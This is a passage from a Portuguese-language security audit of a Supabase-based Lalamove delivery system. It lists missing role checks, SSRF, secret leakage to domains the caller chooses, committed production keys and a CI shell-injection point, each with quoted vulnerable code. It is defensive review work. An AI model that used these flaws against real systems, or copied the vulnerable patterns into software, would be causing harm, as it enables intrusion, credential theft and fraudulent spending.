- **Impacto no negócio:** Um funcionario com acesso apenas de leitura, ou qualquer conta logada que vaze, pode: contratar fretes pagos na conta da empresa, cancelar entregas em andamento, subir a taxa de prioridade (dinheiro), trocar o motorista de uma entrega e, com set-webhook, mandar todos os avisos de status da Lalamove para um endereco de fora - o sistema para de receber atualizacao de entrega e um terceiro passa a receber os dados.
- **Evidência:**
  ```
  supabase/functions/lalamove-api/index.ts:648-700 (nenhum gate antes do switch), :1084-1093 (set-webhook sem papel), :915-925 (JWT só para auditoria best-effort); geo-gateway/index.ts:243-269 (uid só para rate limit); zero ocorrências de user_roles/has_role/requireAdmin em test-notification, rotate-tokens, route-analyzer e geo-gateway; padrões de referência em geo-admin/index.ts:68-85 e send-notification/index.ts:63-75
  ```
- **Causa raiz:** O hardening registrado no config.toml parou no verify_jwt e tratou 'tem JWT' como 'esta autorizado'. O RBAC real do produto vive so no front (src/App.tsx:179 '<Route path="/orders" element={<ProtectedRoute requiredRole="operator">'), e as edges chamadas por essas telas nao repetem a checagem no servidor.
- **Arquivos:** `supabase/functions/lalamove-api/index.ts`, `supabase/functions/test-notification/index.ts`, `supabase/functions/rotate-tokens/index.ts`, `supabase/functions/route-analyzer/index.ts`, `supabase/functions/geo-gateway/index.ts`, `supabase/config.toml`, `src/App.tsx`
- **Etapas do plano:** 010

#### A-007 — route-analyzer: usuário `viewer` usa o LLM pago sem limite e recebe pedidos completos (nome do cliente) lidos com service_role

- **Camada:** Backend — demais edges
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem tem o acesso mais básico ao sistema pode usá-lo como chat de IA ilimitado pago pela empresa e, de passagem, extrair dados de entregas e de clientes que não deveria ver. Não há teto de gasto nem registro de quem gastou.
- **Evidência:**
  ```
  supabase/functions/route-analyzer/index.ts:35 — `const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);` (sem checagem de papel entre :17 e :57). supabase/functions/route-analyzer/index.ts:80-88 — `.from('lalamove_orders').select(...).eq('id', orderId).single();`. supabase/functions/route-analyzer/index.ts:119-122 — `.from('alerts').select(\`*, drivers:driver_id (name), lalamove_orders:order_id (lalamove_id, customer_name)\`)`. supabase/functions/_shared/schemas.ts:111 — `message: z.string().optional(),`. src/App.tsx:157 — `<Route path="/dashboard" element={<ProtectedRoute requiredRole="viewer">...`.
  ```
- **Causa raiz:** O `verify_jwt = true` do supabase/config.toml foi tratado como se fosse o controle de acesso, mas ele só garante "tem um JWT do projeto" — não distingue `viewer` de `admin`, e a chave publicável do front também passa. Sem checagem de papel e sem limite por usuário/por minuto (o geo-gateway tem um, supabase/functions/geo-gateway/index.ts:66-77 `userBuckets`; o route-analyzer não tem nada), cada request gasta tokens da LOVABLE_API_KEY, e o `message` é texto livre de tamanho ilimitado enviado ao modelo. Além do custo, o contexto do prompt é montado com service_role, ou seja, ignorando RLS: `analyze-routes` devolve 20 pedidos inteiros e `analyze-order` devolve qualquer pedido por `orderId`, com nome do cliente e coordenadas, para quem só deveria ver o que a RLS permite.
- **Arquivos:** `supabase/functions/route-analyzer/index.ts`, `supabase/functions/_shared/schemas.ts`, `src/pages/DashboardRedesigned.tsx`, `src/components/dashboard/AIRouteChatbot.tsx`
- **Etapas do plano:** 022

#### A-009 — test-notification envia para destinatário e webhook arbitrários, sem papel e com CORS aberto

- **Camada:** Backend — notificação e fila
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login, inclusive quem só deveria ver relatórios, consegue mandar WhatsApp e e-mail com a identidade da empresa para números e endereços que ela escolher, na conta paga da empresa — e fazer o servidor chamar qualquer URL da internet. Serve para spam, para phishing em nome da empresa e para sondar serviços internos.
- **Evidência:**
  ```
  supabase/functions/test-notification/index.ts:11-12 `const corsHeaders = { "Access-Control-Allow-Origin": "*",`; index.ts:110-113 `body: JSON.stringify({ number: recipients[0], text: message, })`; index.ts:263 `const response = await fetch(webhookUrl, {`; _shared/schemas.ts:130-131 `recipients: z.array(z.string()).optional(), webhookUrl: z.string().url().optional(),`.
  ```
- **Causa raiz:** A função nasceu como ferramenta de teste da tela de configurações e nunca ganhou guarda de papel. `verify_jwt` não está declarado em `supabase/config.toml` (default), então basta um JWT qualquer — inclusive de `viewer`. O `recipients`/`webhookUrl` vão direto para as credenciais pagas (`EVOLUTION_API_KEY`, `RESEND_API_KEY`) e para um fetch de saída sem allowlist.
- **Arquivos:** `supabase/functions/test-notification/index.ts`, `supabase/config.toml`
- **Etapas do plano:** 024

#### M-006 — check-external-api: health check sem autorização alguma que queima credenciais pagas (Mapbox/Google geocoding) por request e fora do orçamento do geo-gateway

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa pode ficar chamando esse endereço em laço e gerar conta de geocodificação na Mapbox e no Google que não aparece no controle de gastos do sistema, além de usar o endpoint para descobrir se as credenciais da empresa estão válidas (ele responde diferente para credencial recusada).
- **Evidência:**
  ```
  supabase/functions/check-external-api/index.ts:15-20 — `Deno.serve(async (req) => { if (req.method === 'OPTIONS') { return new Response('ok', { headers: corsHeaders }); }` e :47 `switch (service) {` (sem leitura de `authorization` em todo o arquivo). supabase/functions/check-external-api/index.ts:256-267 — `const token = Deno.env.get('MAPBOX_SERVER_TOKEN') ?? Deno.env.get('MAPBOX_ACCESS_TOKEN'); ... return runProbe('mapbox', 'geocoding_temporary', url);`. supabase/functions/check-external-api/index.ts:270-280 — `const key = Deno.env.get('GOOGLE_MAPS_SERVER_KEY'); ... maps.googleapis.com/maps/api/geocode/json?address=${q}&key=...`. Contraste: supabase/functions/geo-gateway/index.ts:325 — `await meter(db, usedProvider, fn, result.sku, result.units);`. Ressalva: supabase/config.toml não tem bloco para esta function, mas supabase/config.toml:34 registra que `verify_jwt = true` é o default — logo a chamada exige um JWT do projeto (a chave publicável serve), não é anônima.
  ```
- **Causa raiz:** A function foi feita para "não expor API keys no frontend" (comentário em index.ts:1-3) e ficou sem gate: qualquer caller dispara, por chamada, uma geocodificação real cobrada na conta Mapbox/Google, um ping autenticado na API Lalamove com `LALAMOVE_API_KEY` (:127-133), um GET no webhook Bitrix24 (:167) e um health na Evolution com `EVOLUTION_API_KEY` (:204-209). Ela também passa por fora de toda a contabilidade que o projeto construiu para custo geo (`geo_usage`, `geo_budget`, rate guard do geo-gateway), então esse gasto não aparece no painel nem respeita o limite mensal, e o alerta `GEO_BUDGET_WARNING` nunca é disparado por ele.
- **Arquivos:** `supabase/functions/check-external-api/index.ts`, `supabase/config.toml`, `src/hooks/healthChecks.ts`, `src/hooks/useGeoAdmin.ts`
- **Etapas do plano:** 044

#### M-007 — geo-admin: `manager` cunha e revoga credenciais de faturamento da Mapbox, e o token secreto novo volta no corpo da resposta para o navegador

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um gerente — não só o administrador — pode criar e apagar as chaves que fazem o mapa funcionar e que geram a conta da Mapbox; revogar a errada derruba o mapa e o cálculo de rotas. E o segredo novo trafega até a tela de quem chamou, em vez de ficar só no servidor.
- **Evidência:**
  ```
  supabase/functions/geo-admin/index.ts:74-84 — `.from("user_roles").select("role, is_active, expires_at").eq("user_id", uid).in("role", ["admin", "manager"]); ... if (!allowed) return json({ error: "Forbidden: requires admin or manager role" }, 403);`. supabase/functions/geo-admin/index.ts:174-178 — `return json({ // Devolvido UMA vez, nunca persistido: e o valor que vai para o secret. new_token: created!.token, new_token_id: created!.id, ...`. supabase/functions/geo-admin/index.ts:212-215 — `const delRes = await fetch(\`${TOKENS_API}/${encodeURIComponent(username)}/${encodeURIComponent(target.id)}?access_token=...\`, { method: "DELETE" });`. O token criado é um `sk.` de servidor (docs em .env.example: `MAPBOX_SERVER_TOKEN=xxx # sk. — geo-gateway server-side`), e AGENTS.md diz "MAPBOX_ACCESS_TOKEN nunca no front". A function não tem chamador no repo: `grep -rn "invoke('geo-admin'|functions/v1/geo-admin" src/ supabase/ e2e/ scripts/` retorna 0 (src/hooks/useGeoAdmin.ts chama `geo-gateway` e `check-external-api`, nunca `geo-admin`).
  ```
- **Causa raiz:** O gate exige `admin` OU `manager`, mas a operação é emissão e revogação de credencial que determina a fatura da Mapbox — nível de administrador, não de gerente. E o valor secreto do token novo sai no corpo da resposta HTTP: se um dia a function for chamada de uma tela (hoje não é chamada de lugar nenhum), o `sk.` passa pelo navegador, entra no histórico de rede e em qualquer log de proxy. Por fim, ela continua publicada sem nenhum chamador: é superfície viva que só um runbook manual usa.
- **Arquivos:** `supabase/functions/geo-admin/index.ts`, `supabase/functions/geo-admin/rotation.ts`
- **Etapas do plano:** 045

#### M-009 — get-mapbox-token entrega o token Mapbox a qualquer caller, sem papel e sem medição, por fora do controle de custo do geo-gateway

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A credencial de mapa da empresa fica ao alcance de qualquer pessoa que tenha a chave pública do site, e o consumo gerado com ela não aparece no controle de gastos de mapa — o limite mensal configurado no sistema não enxerga esse uso.
- **Evidência:**
  ```
  supabase/functions/get-mapbox-token/index.ts:16-56 — `serve(async (req) => { ... const mapboxToken = Deno.env.get('MAPBOX_ACCESS_TOKEN'); ... return new Response(JSON.stringify({ token: mapboxToken }), { status: 200, ...` — entre o `serve` e a devolução do segredo não há nenhuma checagem de papel; o único controle é `[functions.get-mapbox-token] verify_jwt = true` (supabase/config.toml), satisfeito pela chave publicável do front (src/integrations/supabase/client.ts:7). supabase/functions/get-mapbox-token/index.ts:11-13 — `'Access-Control-Allow-Origin': '*'`. O health check do painel busca o token só para testar: src/hooks/healthChecks.ts:49 — `await supabase.functions.invoke('get-mapbox-token', { body: { healthCheck: true } })`, e a function ignora o campo (o contrato em supabase/functions/_shared/schemas.ts:322-327 o aceita, mas index.ts não o lê), devolvendo o token completo. Contraste com o desenho do projeto: supabase/config.toml descreve `geo-gateway` como "camada única de acesso a provedores de mapa ... mede custo em geo_usage e usa o token Mapbox de servidor".
  ```
- **Causa raiz:** O token é entregue ao navegador sem distinção de papel e com CORS aberto, e o consumo que ele gera depois acontece direto contra a Mapbox, sem passar pelo `meter`/`geo_budget` do geo-gateway (supabase/functions/geo-gateway/index.ts:325). O health check agrava: para responder "a Mapbox está de pé", a function devolve o segredo inteiro em vez de um booleano, espalhando o valor por logs de rede e de erro do front a cada ciclo de monitoramento.
- **Arquivos:** `supabase/functions/get-mapbox-token/index.ts`, `supabase/config.toml`, `src/hooks/healthChecks.ts`, `src/hooks/useSystemHealth.ts`, `src/components/map/hooks/useMapboxToken.ts`
- **Etapas do plano:** 047
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Falta ver o valor de `MAPBOX_ACCESS_TOKEN` em produção (não deve ser lido nem impresso): se for um `pk.` com restrição de domínio na conta Mapbox, o risco é só de consumo não medido; se for um `sk.`, é vazamento de segredo de servidor e a severidade sobe para Crítica. Checar no painel Mapbox o tipo e os escopos do token, e se há URL restriction.

#### M-026 — rotate-tokens: sem autorização e sem agendador — qualquer caller força a rotação dos tokens OAuth do Bitrix24 e pode derrubar a integração

- **Camada:** Backend — demais edges
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A sincronização com o Bitrix24 pode parar de duas formas: ninguém renova os tokens e eles vencem, ou alguém de fora força renovações até o Bitrix invalidar o acesso. Em ambos os casos os pedidos deixam de aparecer no CRM, e o painel de alertas enche de avisos críticos.
- **Evidência:**
  ```
  supabase/functions/rotate-tokens/index.ts:70-94 (sem check de papel), :158-172 (o `update` CAPTURA `updateError`, ao contrário de outros pontos do repo), :196-206 (devolve `results` com `error` cru do Bitrix). supabase/config.toml: rotate-tokens não declarado → verify_jwt=true por default (exige JWT, aceita anon key). Mitigação do impacto: supabase/functions/bitrix24-sync/index.ts:136-168 e bitrix24-process-queue/index.ts:112-133 renovam o token sob demanda.
  ```
- **Causa raiz:** A function é um worker de rotação que nunca ganhou gate nem agendador. Dois problemas somados: (a) sem autorização, qualquer caller dispara a rotação na hora que quiser — e como refresh token de OAuth2 é de uso único, forçar rotações em paralelo ou em sequência faz o Bitrix invalidar o par e as chamadas seguintes falharem, com o `update` condicionado a `.eq('refresh_token', token.refresh_token)` (:168) deixando o banco com um token já consumido; (b) sem nenhum `cron.schedule` no repo apontando para ela (ao contrário de escalate-alerts, lalamove-token-refresh e job-worker, agendados em supabase/migrations/20261122140000_fix_crons_dispatcher.sql:104-130), a rotação que o arquivo diz ser obrigatória provavelmente não acontece — os tokens vencem sozinhos. Cada falha ainda insere um alerta `CRITICAL` em `alerts` (:53-63), então chamadas repetidas também servem para inundar o painel de alertas.
- **Arquivos:** `supabase/functions/rotate-tokens/index.ts`, `supabase/config.toml`, `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`
- **Etapas do plano:** 105
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Falta acesso à produção: (a) `select jobname, schedule, command from cron.job` para saber se existe agendamento de rotate-tokens criado fora do repo; (b) `select domain, expires_at from bitrix24_tokens` para ver se há token vencido; (c) lista de edges deployadas, para confirmar que rotate-tokens está publicada.

#### M-038 — `route-analyzer` não checa papel nem limita taxa: qualquer autenticado gasta crédito de IA e manda a base de motoristas e pedidos para fora

- **Camada:** Integrações e contratos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um usuário de perfil mais baixo pode rodar a análise de IA em sequência e torrar o crédito pago da conta, e cada chamada envia para fora dados de motorista, cliente, endereço e telefone que o perfil dele não poderia nem ver na tela — risco de LGPD além do custo.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/route-analyzer/index.ts:98-107 → `const { data: drivers, error: driversError } = await supabase.from('drivers').select(\`*, driver_incidents (type, severity, created_at)\`).order('risk_score', { ascending: false }).limit(20);` com `supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY)` (:35)  ·  /home/user/Lalamove_V2/supabase/functions/route-analyzer/index.ts:163-176 → `await fetch('https://ai.gateway.lovable.dev/v1/chat/completions', { headers: { 'Authorization': \`Bearer ${LOVABLE_API_KEY}\` }, body: JSON.stringify({ model: 'google/gemini-2.5-flash', messages, stream: false }) })`  ·  /home/user/Lalamove_V2/supabase/config.toml:27-31 → `# route-analyzer: ... Sem auth qualquer caller podia exfiltrar dados de entrega e esgotar créditos da API.` / `verify_jwt = true`
  ```
- **Causa raiz:** O `config.toml` resolveu só a autenticação. A função usa `service_role` (ignora RLS), serializa linhas inteiras de `drivers`+`driver_incidents`, `lalamove_orders`+`active_tracking`+`lalamove_stops` ou `alerts` com `JSON.stringify(..., null, 2)` dentro do system prompt (:76, :93, :110, :127) e envia para o gateway de IA de terceiro — sem nenhuma consulta a `user_roles`, sem bucket por usuário e sem teto de chamadas. O repo tem os dois padrões prontos e não usou nenhum: `geo-gateway/index.ts:66-77` (`userAllowed`, bucket por `uid` do JWT) e `geo-admin/index.ts:68-85` (recheck de `user_roles`). O AGENTS.md avisa explicitamente que `LOVABLE_API_KEY` tem custo por token.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/route-analyzer/index.ts`, `/home/user/Lalamove_V2/supabase/config.toml`
- **Etapas do plano:** 117


## Causa raiz: O servidor acredita no que o próprio solicitante manda sobre identidade, poder e destino

Em vez de descobrir no servidor quem está chamando e para onde a informação pode ir, essas funções leem esses dados do próprio pedido recebido. O papel do usuário vem de um campo que ele mesmo pode editar no perfil; o dono do dispositivo registrado e da auditoria vem de um número enviado no corpo; as estatísticas que decidem se um motorista é bloqueado vêm de quem chamou; e o endereço de internet para onde o sistema envia o segredo do Bitrix24 ou uma mensagem de WhatsApp vem solto, sem lista do que é permitido. Quem conhece o formato da chamada escolhe o resultado.

**5 achado(s) sob esta causa.**


#### C-007 — bitrix24-sync entrega o BITRIX24_CLIENT_SECRET para um domínio escolhido pelo chamador, e o domínio fica salvo no banco

- **Camada:** Backend — notificação e fila
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login no sistema consegue fazer o servidor entregar a senha de integração do Bitrix24 para um site dela. Com essa senha dá para ler e alterar os negócios no CRM da empresa, e o estrago continua depois, porque o endereço falso fica gravado e é reusado automaticamente.
- **Evidência:**
  ```
  supabase/functions/bitrix24-sync/index.ts:92 `const domain = url.searchParams.get("domain") || (params && params.domain);` · :101-105 `const tokenResponse = await fetch(`https://${domain}/oauth/token/`, { ... body: new URLSearchParams({ grant_type: "authorization_code", client_id: clientId!, client_secret: clientSecret!, code: code, }) });` · :123-128 `await supabase.from("bitrix24_tokens").upsert({ domain: domain, ... }, { onConflict: "domain" });` · send-notification/index.ts:1419-1420 `fetch(`https://${token.domain}/rest/tasks.task.add?auth=${token.access_token}`,` · proteção existente que NÃO cobre o caso: supabase/config.toml:78-79 `[functions.bitrix24-sync]` + `verify_jwt = true`
  ```
- **Causa raiz:** `domain` vem cru da query string / do corpo, sem allowlist e sem validação de host. Nada amarra o `domain` ao domínio Bitrix24 contratado. Como o `upsert` grava esse mesmo `domain`, um valor envenenado passa a ser reusado por `bitrix24-process-queue` em todo ciclo de fila (e por `sendBitrix24Task` em send-notification/index.ts:1419-1420).
- **Arquivos:** `supabase/functions/bitrix24-sync/index.ts`, `supabase/functions/bitrix24-process-queue/index.ts`, `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 006

#### C-008 — `bitrix24-sync` action `oauth_callback` manda `BITRIX24_CLIENT_SECRET` para o domínio que vem na query — sem allowlist

- **Camada:** Integrações e contratos
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Vazamento da credencial do aplicativo Bitrix24 da empresa: quem tiver qualquer login no sistema faz o servidor entregar o segredo do app para um site de fora. Com ele é possível se passar pelo app e ler/alterar o CRM. Exige rotação da credencial no painel Bitrix24.
- **Evidência:**
  ```
  /home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts:90 → `const domain = url.searchParams.get("domain") || (params && params.domain);` · :100 → `const tokenResponse = await fetch(\`https://${domain}/oauth/token/\`, {` · :105-106 → `client_id: clientId!,` / `client_secret: clientSecret!,` · /home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts:379 → `domain: z.string().optional(),`
  ```
- **Causa raiz:** `domain` é string livre no contrato e é interpolada direto na URL de um POST que carrega `client_id` e `client_secret`. Não há allowlist (`*.bitrix24.com.br`/`*.bitrix24.com`), nem validação de hostname, nem comparação com o `domain` já gravado em `bitrix24_tokens`. Como `bitrix24-sync` também não tem checagem de papel, qualquer sessão autenticada basta. A mesma falta de validação está em `get_auth_url` (:78-80), que monta a URL de autorização com o domínio do chamador.
- **Arquivos:** `/home/user/Lalamove_V2/supabase/functions/bitrix24-sync/index.ts`, `/home/user/Lalamove_V2/supabase/functions/_shared/schemas.ts`
- **Etapas do plano:** 012

#### A-008 — new-device-alert confia no userId e no e-mail do corpo: registra dispositivo e grava auditoria no nome de outro usuário

- **Camada:** Backend — notificação e fila
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com login consegue inserir dispositivos e registros de "login em novo dispositivo" na conta de outra, sujando a trilha de auditoria de segurança, e consegue disparar um e-mail de alerta de segurança com o nome da empresa para qualquer endereço. Dá para usar isso para enganar um funcionário ou para esconder um acesso real no meio de registros falsos.
- **Evidência:**
  ```
  supabase/functions/new-device-alert/index.ts:40-41 `const supabaseServiceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;` + index.ts:256-258 `await supabase.from("auth_logs").insert({ user_id: userId, event_type: "new_device_login",` — `userId` vem só do corpo validado (index.ts:60-80), sem comparação com o `sub` do JWT.
  ```
- **Causa raiz:** A função roda com `SUPABASE_SERVICE_ROLE_KEY` (index.ts:40-41) e usa o `userId` do corpo como se fosse o do chamador. Não existe leitura do `sub` do JWT nem checagem de papel; o schema (`_shared/schemas.ts:88-98`) só valida formato.
- **Arquivos:** `supabase/functions/new-device-alert/index.ts`
- **Etapas do plano:** 023

#### A-017 — SSRF em test-notification: a edge faz POST em qualquer URL enviada pelo caller, e dispara WhatsApp/e-mail para destinatario arbitrario

- **Camada:** Transversal — segurança
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer conta logada pode usar o servidor da empresa para bater em endereco escolhido por ela (inclusive servicos internos que so o servidor enxerga) e, com as credenciais da empresa, mandar WhatsApp para qualquer numero e e-mail para qualquer endereco - conta de mensageria, risco de a empresa ser usada para disparo indesejado e de o numero ser bloqueado.
- **Evidência:**
  ```
  supabase/functions/test-notification/index.ts:23-86 (handler sem gate de papel), :45 e :67 (URL do corpo), :255-274 (fetch POST na URL arbitrária), :276-280 (resposta só com status — SSRF cego), :104-114 (WhatsApp com EVOLUTION_API_KEY para `recipients[0]`), :142-162 (Resend `to: recipients`); contrato em supabase/functions/_shared/schemas.ts:131. supabase/config.toml não declara a função: default verify_jwt = true, mas a chave anon pública satisfaz esse check.
  ```
- **Causa raiz:** Function de teste manual exposta como endpoint de producao: valida a FORMA do payload (contrato) mas nao valida o DESTINO nem quem pode chamar. z.string().url() aceita qualquer host, inclusive endereco interno.
- **Arquivos:** `supabase/functions/test-notification/index.ts`, `supabase/functions/_shared/schemas.ts`
- **Etapas do plano:** 032

#### M-030 — skip_dedup e is_escalation aceitos de qualquer usuário autenticado

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Um usuário comum, mesmo só de leitura, consegue disparar a mesma notificação em série para todos os telefones, e-mails e canais já cadastrados — gasto de mensagem e incômodo no cliente — e consegue marcar um alerta como "já escalonado" sem ter sido, fazendo o alerta sumir da fila de escalonamento.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:161 `const isEscalation = extra.is_escalation === true;` + :171 `if (!isEscalation && extra.skip_dedup !== true) {` + :987-991 `if (isEscalation) { await supabase.from("alerts").update({ escalated_at: new Date().toISOString(), escalation_level: 1 }).eq("id", alert_id); }`; contraste com o portão existente em :565-567 e :674-676. Uso legítimo de skip_dedup por usuário: src/components/orders/OrderGeoEvents.tsx:95 `skip_dedup: true,`
  ```
- **Causa raiz:** O comentário em index.ts:59-62 identifica o problema ("verify_jwt=true … includes ordinary authenticated users") e a correção foi aplicada só a `metadata.recipients`. `skip_dedup`, `dedup_key` e `is_escalation` continuam livres, e os três controlam justamente a proteção contra repetição e a marcação de escalonamento.
- **Arquivos:** `supabase/functions/send-notification/index.ts`, `supabase/functions/_shared/schemas.ts`
- **Etapas do plano:** 109


## Causa raiz: Senhas, chaves e dados reais de clientes guardados em lugar que não é cofre

Entregáveis de sessões antigas de análise (documentação, relatório de pedidos, fluxos exportados do n8n) foram salvos dentro do repositório com os valores reais dentro, e as chaves de produção da Lalamove acabaram escritas em dez arquivos. O mesmo descuido aparece nos bastidores: a chave que dispara as rotinas automáticas fica em texto claro no comando agendado do banco, o token do Bitrix24 viaja no endereço da requisição e aparece no registro de erro junto com o telefone completo do motorista, e a rotina de aplicar mudanças no banco cola texto não verificado dentro de um comando que já tem o token de produção à mão.

**5 achado(s) sob esta causa.**


#### C-010 — Credenciais de PRODUCAO da Lalamove (API key + secret HMAC) versionadas em 10 arquivos

- **Camada:** Transversal — segurança
- **Severidade:** Crítica · **Confiança:** confirmado · **Modo:** EXECUTADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Qualquer pessoa com acesso ao repositorio, a um clone, fork ou backup pode criar fretes pagos, cancelar entregas e assinar webhooks falsos na conta real da Lalamove. Gasto direto na fatura e entregas fantasma, sem precisar de login no sistema.
- **Evidência:**
  ```
  10 arquivos rastreados com `pk_prod_` (40 chars) / `sk_prod_` (72 chars) completos, inclusive lalamove_documentacao_completa.md, lalamove_bundle_import.json, lalamove_f01_cotacao.json, lalamove_f03_rastreamento.json; scripts/pre-commit-secrets.sh:54 exclui '\.md$' e nenhum padrão pk_prod_/sk_prod_ existe em scripts/pre-commit-secrets.sh, scripts/ci/*.mjs ou .github/workflows/*.yml
  ```
- **Causa raiz:** Documentacao e os fluxos n8n foram gerados com os valores reais embutidos e commitados na raiz. Nenhuma guarda cobre esses arquivos: scripts/pre-commit-secrets.sh:54 exclui '\.md$' da varredura e nao tem padrao pk_prod_/sk_prod_; nao existe hook pre-commit instalado (sem husky no package.json); scripts/ci/check-bundle-secrets.mjs so varre dist/ e so procura JWT do Supabase.
- **Arquivos:** `lalamove_documentacao_completa.md`, `lalamove_documentacao_completa.html`, `lalamove_documentacao_completa.docx`, `lalamove_documentacao_completa.md.pdf`, `lalamove_suplemento_v2.md`, `lalamove_suplemento_v2.html`, `lalamove_bundle_import.json`, `lalamove_f00_bootstrap.json`, `lalamove_f01_cotacao.json`, `lalamove_f02_pedido.json`, `lalamove_f03_rastreamento.json`, `lalamove_f04_pod.json`, `scripts/pre-commit-secrets.sh`, `scripts/ci/check-bundle-secrets.mjs`
- **Etapas do plano:** 001, 002

#### A-001 — Chave do dispatcher gravada em texto puro no comando do cron e chave publishable literal dentro de migration — contra a regra escrita do próprio repo

- **Camada:** Banco — funções, triggers e cron
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** A credencial que autoriza chamar as edge functions fica legível em texto puro dentro do banco e no histórico do Git, e qualquer cópia, dump ou remix do projeto a carrega junto — rotacionar deixa de ser suficiente para conter um vazamento.
- **Evidência:**
  ```
  supabase/migrations/20261123190000_cron_check_driver_alerts.sql:27-28 e 41-56 (format %L recoloca a chave em cron.job.command); 20251226010001_configure_pg_cron.sql:126-143 (SECURITY DEFINER sem check de papel devolvendo cron.job.command); 20260902000000_harden_revoke_anon_grants.sql:11 (EXECUTE das funções preservado); 20261122140000_fix_crons_dispatcher.sql:119 e :133 (publishable literal)
  ```
- **Causa raiz:** Tirar a chave do SQL versionado resolveu metade do problema: o `format(%L)` recoloca o valor decifrado no texto do job, que o pg_cron guarda em claro. E as duas migrations anteriores ainda carregam a chave publishable literal porque a correção de 21/11 priorizou destravar o 401.
- **Arquivos:** `supabase/migrations/20261123190000_cron_check_driver_alerts.sql`, `supabase/migrations/20261122140000_fix_crons_dispatcher.sql`, `supabase/migrations/20251226010001_configure_pg_cron.sql`, `docs/CRON_JOBS.md`, `docs/agentes/banco.md`
- **Etapas do plano:** 016

#### M-015 — Token de acesso do Bitrix24 viaja na query string e o telefone completo vai para o log no caminho Zapp

- **Camada:** Backend — notificação e fila
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A credencial do CRM e o telefone completo de motoristas e clientes ficam registrados no log da função, que fica guardado e é lido por várias pessoas. É vazamento de credencial e de dado pessoal sem necessidade nenhuma — o aviso funciona igual com o número mascarado.
- **Evidência:**
  ```
  (a) supabase/functions/send-notification/index.ts:1419-1420 `const response = await fetch( `https://${token.domain}/rest/tasks.task.add?auth=${token.access_token}`,` com :1435 `logger.error("[Bitrix24] Error:", error);` e supabase/functions/_shared/logger.ts:11-13 `error: (...args: unknown[]) => { console.error(...args); }`. (b) supabase/functions/_shared/logger.ts:4-6 `log: (...args: unknown[]) => { if (isDev) console.log(...args); }` — a linha 1136 (`number.replace(/\D/g, "")`) não chega a nenhum log em produção.
  ```
- **Causa raiz:** (a) O `access_token` é posto na URL em vez do corpo; a mensagem de erro de `fetch` no Deno inclui a URL, então um erro de rede imprime o token no log da função. (b) A máscara de telefone da etapa 142 (`maskPhone`, `_shared/phone.ts:67-77`) foi aplicada só no ramo Evolution; o ramo Zapp — que é o preferencial quando `ZAPP_API_URL`/`ZAPP_API_KEY` existem (index.ts:1122-1123) — loga o número inteiro.
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 053

#### M-141 — workflow_dispatch de apply-migrations.yml interpola o input direto no bash, com o token de producao no ambiente

- **Camada:** Infra, CI e deploy
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Quem conseguir disparar esse workflow (qualquer conta com escrita no repo, inclusive um agente) pode roubar a chave que da controle total do banco de producao — todos os pedidos, clientes e motoristas.
- **Evidência:**
  ```
  .github/workflows/apply-migrations.yml:50 — `IFS=',' read -ra FILES <<< "${{ github.event.inputs.files }}"` (identico em :78); :32-34 — `env:` / `SUPABASE_ACCESS_TOKEN: ${{ secrets.SUPABASE_ACCESS_TOKEN }}` / `PROJECT_REF: iecgydonctmabiijadsf`
  ```
